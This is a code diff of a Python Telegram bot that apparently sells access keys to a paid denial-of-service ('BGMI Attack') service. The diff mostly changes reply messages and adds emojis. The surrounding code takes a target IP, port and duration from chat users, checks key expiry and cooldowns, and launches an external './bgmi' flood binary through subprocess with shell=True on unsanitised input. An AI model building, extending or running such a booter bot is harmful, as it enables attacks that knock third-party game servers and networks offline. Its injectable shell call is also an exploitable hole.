@@ -22,7 +22,7 @@ LOG_FILE = "log.txt"
 KEY_FILE = "keys.json"
 
 # Cooldown time for users
-COOLDOWN_TIME = 300  # 5 minutes
+COOLDOWN_TIME = 300  # 5minutes
 
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
@@ -66,7 +66,7 @@ def clear_logs():
                 response = "Logs are already cleared. No data found."
             else:
                 file.truncate(0)
-                response = "Logs cleared successfully ✅"
+                response = "🗑️Logs cleared successfully ✅"
     except FileNotFoundError:
         response = "No logs found to clear."
     return response
@@ -109,7 +109,7 @@ def generate_key_command(message):
         else:
             response = "Usage: /generatekey <days>"
     else:
-        response = "ONLY OWNER CAN USE."
+        response = "🫅ONLY OWNER CAN USE🫅"
 
     bot.reply_to(message, response)
 
@@ -144,7 +144,7 @@ def handle_bgmi(message):
         if datetime.datetime.now() <= expiration_date:
             if user_id not in admin_id:
                 if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                    response = f"You are on cooldown. Please wait {COOLDOWN_TIME // 300} minute(s) before running the /bgmi command again."
+                    response = f"You are on cooldown. Please wait {COOLDOWN_TIME // 300} 5minutes before running the /bgmi command again."
                     bot.reply_to(message, response)
                     return
                 bgmi_cooldown[user_id] = datetime.datetime.now()
@@ -156,29 +156,29 @@ def handle_bgmi(message):
                     port = int(command[2])
                     time = int(command[3])
                     if time > 180:
-                        response = "Error: Time interval must be less than 180 seconds."
+                        response = "⚠️Error: Time interval must be less than 180 seconds."
                     else:
                         record_command_logs(user_id, '/bgmi', target, port, time)
                         log_command(user_id, target, port, time)
                         start_attack_reply(message, target, port, time)
                         full_command = f"./bgmi {target} {port} {time} 360"
                         subprocess.run(full_command, shell=True)
-                        response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+                        response = f"🎮BGMI Attack Finished🎮 Target: {target} Port: {port} Time: {time}"
                 except ValueError:
                     response = "Error: Port and time must be integers."
             else:
                 response = "✅Usage: /bgmi <target> <port> <time>"
         else:
-            response = "Your access has expired. Please redeem a new key."
+            response = "❌Your access has expired. Please redeem a new key❌"
     else:
-        response = "You are not authorized to use this command."
+        response = "🚫You are not authorized to use this command🚫"
 
     bot.reply_to(message, response)
 
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
-    response = f"{username}, 🔥🔥ATTACK STARTED.🔥🔥\n\nTarget: {target}\nPort: {port}\nTime: {time} Seconds\nMethod: BGMI-VIP"
+    response = f"{username}, 🔥🔥ATTACK STARTED.🔥🔥\n\n🎯Target: {target}\n🚪Port: {port}\n⏳Time: {time} Seconds\nMethod: BGMI-VIP"
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['clearlogs'])
